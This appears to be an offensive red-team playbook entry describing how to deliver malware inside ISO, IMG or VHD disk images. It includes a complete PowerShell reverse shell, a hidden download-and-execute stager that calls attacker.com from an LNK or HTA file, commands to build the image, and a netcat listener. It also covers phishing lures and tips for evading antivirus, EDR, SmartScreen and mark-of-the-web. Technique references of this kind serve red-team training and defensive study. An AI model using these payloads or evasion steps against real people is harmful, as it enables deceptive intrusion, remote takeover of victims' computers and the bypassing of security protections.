# ISO/IMG/VHD Files (Virtual Media Delivery)

**Type:** Malicious Documents & File-Based Delivery
**Platform:** Windows, linux, macOS 
**Prerequisites:** User must mount and open the virtual image (ISO, IMG, or VHD); SmartScreen or Defender may warn if payload is unsigned or dropped from internet


---
## Overview

**ISO/IMG/VHD files** are disk image formats that can be mounted by Windows natively. Attackers weaponize these formats by embedding **malicious executables, LNK shortcuts, HTA files, or scripts** that get executed **when the victim opens the mounted image**.

This method gained popularity in the wild (e.g., Emotet, QakBot) to **bypass email security filters**. Many mail gateways block `.exe`, `.js`, and `.vbs` , but **not zipped ISO/VHD files**. Once the user opens the archive and interacts with its contents ( clicks on a executable file ) initial code execution is achieved.


---
## How It Works

1. The attacker creates an ISO, IMG, or VHD file.
2. The virtual image contains:
   - Malicious `.lnk` file pointing to a payload
   - Or, `.exe`, `.hta`, `.js`, or `.vbs` script
3. The image is compressed into a `.zip` or `.rar` archive.
4. The victim extracts the archive, **mounts** the image, and **executes the payload** (often by clicking a disguised LNK file).
5. A connection is established back to the attacker's system (e.g., reverse shell).

Since Windows 8 and above, ISO/IMG/VHD files **automatically mount on double-click**, making execution seamless for attackers.



---
## Prerequisites

**Tools Needed**
- `msfvenom`, `PowerShell`, or other payload generator
- `mkisofs`, `PowerISO`, `oscdimg`, or `VBoxManage` (for ISO/VHD creation)
- `7-Zip` or `WinRAR` (optional: for archiving)
- Windows VM for testing


---
## Steps to Implement

1. **Create Reverse Shell Payload**
e.g : "shell.ps1"

```powershell
$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```

2. **Create a Malicious LNK File (Optional)**

Create a `.lnk` shortcut pointing to:

```shell
powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')
```

You can use Windows Script Host Object Model or a tool like **`lnk-creator.ps1`** .
3. **Prepare the Folder Structure**

```
malicious_media/
├── invoice.lnk          # Shortcut pointing to shell.exe or web payload
```

4. **Build the ISO File**

Using **`mkisofs`** (Linux/macOS):
```shell
mkisofs -o payload.iso -J -R malicious_media/
```

Using oscdimg (Windows):
```
oscdimg -lPAYLOAD -m malicious_media payload.iso
```

Or create a VHD using Disk Management → Attach VHD → Initialize → Format → Add files → Detach → Compress.

5. **Compress ISO into ZIP ( optional )**

> use `7-zip` to bypass MOTW ( mark of the web ) windows security feature, 

This helps evade AV, EDR, and email filters that block .exe or .lnk. 

6. **Deliver to Target**

- Via phishing email: “Please review the attached ISO archive”
- Via file share or USB drop
- Via Google Drive, Dropbox, or OneDrive link

7. **Set Up Listener**

```shell
nc -lvnp 4444
```

Wait for shell access once the user opens the ISO and executes the executable file included in the image .



---
## Payload/Code Snippets

- **Example PowerShell Stager in LNK** 
```shell
powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
```

- **Reverse Shell with HTA**
Embed this in a hta file and drop it inside the ISO:
```html
<script>
var r = new ActiveXObject("WScript.Shell");
r.Run("powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')");
</script>
```

- **simple powershell reverse shell** 
```powershell
$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```



---
## Tips

- Rename files to look benign (invoice.lnk, summary.pdf)
- Use matching icons to trick the user into clicking .lnk as if it’s a document
- Avoid detection by signing payloads or packing in ZIP + password
- Use LNKs instead of EXEs for better stealth (bypasses SmartScreen in many cases)
- Bundle decoy PDFs inside the ISO for social engineering
- use password protected `7z` archive to evade  AV, EDR, MOTW, ...



---
## References

- [MITRE ATT&CK – T1566.001: Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/)
- [T1203 – Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203/)
- [Malicious ISO File Leads to Domain Wide Ransomware](https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/)
- [Why so, ISO? Mark-of-the-Web, explained](https://redcanary.com/blog/threat-detection/iso-files/)
- [Delivery of Malware: A Look at Phishing Campaigns in Q3 2022](https://www.fortinet.com/blog/threat-research/delivery-of-malware-phishing-campaigns-in-q3-2022?utm_source=chatgpt.com)
- [Weaponized Disk Image Files: Analysis, Trends and Remediation](https://www.crowdstrike.com/en-us/blog/weaponizing-disk-image-files-analysis/?utm_source=chatgpt.com)


---

**_Author_** : **o-sec**